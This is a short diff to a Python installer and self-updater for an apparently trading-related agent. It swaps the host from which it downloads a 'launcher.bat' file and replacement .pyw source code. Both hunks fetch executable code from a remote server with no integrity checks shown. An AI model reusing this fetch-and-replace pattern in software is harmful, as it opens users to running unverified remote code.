@@ -299,7 +299,7 @@ class InstallWizard:
                 try:
                     _log("Downloading launcher.bat...")
                     import urllib.request as _ur3
-                    _req3 = _ur3.Request("https://mt5cloud.esgov.org/api/agent-download", headers={
+                    _req3 = _ur3.Request("https://tradotcom.com/api/agent-download", headers={
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TradotcomAgent/1.0"})
                     with _ur3.urlopen(_req3, timeout=20) as _r3:
                         with open(_lnk_bat, "wb") as _f3:
@@ -474,7 +474,7 @@ def _self_update():
     try:
         _log("Checking pyw update...")
         import urllib.request as _ur2
-        _req = _ur2.Request("https://mt5cloud.esgov.org/api/agent-pyw", headers={
+        _req = _ur2.Request("https://tradotcom.com/api/agent-pyw", headers={
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TradotcomAgent/1.0"})
         with _ur2.urlopen(_req, timeout=15) as _r:
             _new = _r.read()
